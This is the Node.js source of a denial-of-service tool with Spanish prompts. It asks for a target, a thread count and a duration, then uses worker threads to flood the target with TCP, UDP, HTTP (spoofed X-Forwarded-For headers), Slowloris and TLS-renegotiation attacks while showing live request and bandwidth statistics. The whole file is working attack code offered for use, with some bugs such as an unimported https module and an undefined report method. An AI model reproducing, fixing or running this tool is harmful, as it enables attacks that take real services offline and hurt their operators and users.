#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const tls = require('tls');
const http = require('http');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');
const dns = require('dns/promises');
const url = require('url');

class DDoSApp {
    constructor() {
        this.stats = { requests: 0, success: 0, failed: 0, bandwidth: 0, sockets: 0 };
        this.workers = [];
        this.methods = new Map([
            ['TCP', this.tcpAttack],
            ['UDP', this.udpAttack],
            ['HTTP', this.httpAttack],
            ['SLOWLORIS', this.slowlorisAttack],
            ['SSL', this.sslAttack]
        ]);
        this.colors = {
            time: chalk.cyanBright,
            req: chalk.whiteBright,
            success: chalk.greenBright,
            fail: chalk.redBright,
            rps: chalk.yellowBright,
            bw: chalk.magentaBright,
            conn: chalk.blueBright
        };
    }

    async start() {
        const target = await this.getInput(chalk.greenBright('Objetivo (URL/IP): '));
        const { host, port, protocol } = await this.resolveTarget(target);
        const threads = await this.getNumber(chalk.greenBright('Hilos (500-5000): '), 500, 5000);
        const duration = await this.getNumber(chalk.greenBright('Duración (segundos): '), 60, 86400);
        const method = await this.selectMethod();

        this.startTime = Date.now();
        this.launchWorkers(host, port, threads, method, protocol);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    tcpAttack(host, port) {
        const socket = net.connect(port, host, () => {
            socket.write(crypto.randomBytes(1024));
            socket.end();
            this.report(1, 1024);
        }).on('error', () => this.report(0, 0));
    }

    udpAttack(host, port) {
        const socket = dgram.createSocket('udp4');
        socket.send(crypto.randomBytes(65507), port, host, () => {
            this.report(1, 65507);
            socket.close();
        }).on('error', () => this.report(0, 0));
    }

    httpAttack(host, port, protocol) {
        const mod = protocol === 'https' ? https : http;
        mod.get(`${protocol}://${host}:${port}`, {
            headers: {
                'User-Agent': crypto.randomBytes(16).toString('hex'),
                'X-Forwarded-For': `${crypto.randomInt(1,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(0,255)}.${crypto.randomInt(1,255)}`
            }
        }, () => this.report(1, 0)).on('error', () => this.report(0, 0));
    }

    slowlorisAttack(host, port) {
        const socket = net.connect(port, host);
        socket.write(`GET /${crypto.randomBytes(8).toString('hex')} HTTP/1.1\r\nHost: ${host}\r\n`);
        const keepAlive = () => {
            socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
            this.stats.sockets++;
            setTimeout(keepAlive, 15000);
        };
        keepAlive();
    }

    sslAttack(host, port) {
        const socket = tls.connect(port, host, {
            rejectUnauthorized: false,
            secureProtocol: 'TLS_method'
        }, () => setInterval(() => socket.renegotiate({}, () => {}), 5000));
    }

    launchWorkers(host, port, threads, method, protocol) {
        const cores = Math.min(require('os').cpus().length, 16);
        for (let i = 0; i < cores; i++) {
            const worker = new Worker(__filename, {
                workerData: { 
                    host, 
                    port, 
                    method: method === 'ALL' ? [...this.methods.keys()] : [method],
                    protocol, 
                    intensity: Math.ceil(threads / cores) 
                }
            });
            worker.on('message', msg => this.updateStats(msg));
            this.workers.push(worker);
        }
    }

    updateStats(data) {
        this.stats.requests += data.requests;
        this.stats.success += data.success;
        this.stats.failed += data.failed;
        this.stats.bandwidth += data.bandwidth;
        this.stats.sockets += data.sockets;
    }

    showStats() {
        const elapsed = (Date.now() - this.startTime) / 1000;
        const rps = (this.stats.requests / elapsed).toFixed(0);
        const bw = (this.stats.bandwidth / 1024 ** 3).toFixed(3);
        
        const statsLine = [
            this.colors.time(`[${elapsed.toFixed(1)}s]`),
            this.colors.req(`Peticiones: ${this.stats.requests}`),
            `${this.colors.success(this.stats.success)} éxitos`,
            `${this.colors.fail(this.stats.failed)} fallos`,
            this.colors.rps(`RPS: ${rps}`),
            this.colors.bw(`BW: ${bw}GB`),
            this.colors.conn(`Conexiones: ${this.stats.sockets}`)
        ].join(' ');

        process.stdout.write(`\r${statsLine}`);
        setTimeout(() => this.showStats(), 500);
    }

    async getInput(prompt) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(prompt, answer => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async getNumber(prompt, min, max) {
        let value;
        do value = parseInt(await this.getInput(prompt)) || min;
        while (value < min || value > max);
        return value;
    }

    async selectMethod() {
        console.log(chalk.greenBright('\nMétodos disponibles:'));
        const methods = [...this.methods.keys(), 'ALL'];
        methods.forEach((m, i) => 
            console.log(chalk.hex('#00FF00')(` ${i + 1}. ${m}`)));
        
        const choice = await this.getNumber(chalk.greenBright('Seleccione método (1-6): '), 1, 6);
        return methods[choice - 1];
    }

    async resolveTarget(input) {
        try {
            if (!input.includes('://')) input = 'http://' + input;
            const parsed = new url.URL(input);
            const resolved = await dns.lookup(parsed.hostname);
            return {
                host: resolved.address,
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                protocol: parsed.protocol.replace(':', '')
            };
        } catch (error) {
            console.log(chalk.redBright('\nError: Objetivo inválido'));
            process.exit(1);
        }
    }

    stop() {
        this.workers.forEach(w => w.terminate());
        console.log(chalk.greenBright('\nAtaque detenido'));
        process.exit();
    }
}

if (!isMainThread) {
    const { host, port, method, protocol, intensity } = workerData;
    const app = new DDoSApp();

    setInterval(() => {
        for (let i = 0; i < intensity; i++) {
            const currentMethod = method[Math.floor(Math.random() * method.length)];
            app.methods.get(currentMethod)(host, port, protocol);
        }
    }, 50);
}

if (isMainThread) {
    new DDoSApp().start();
}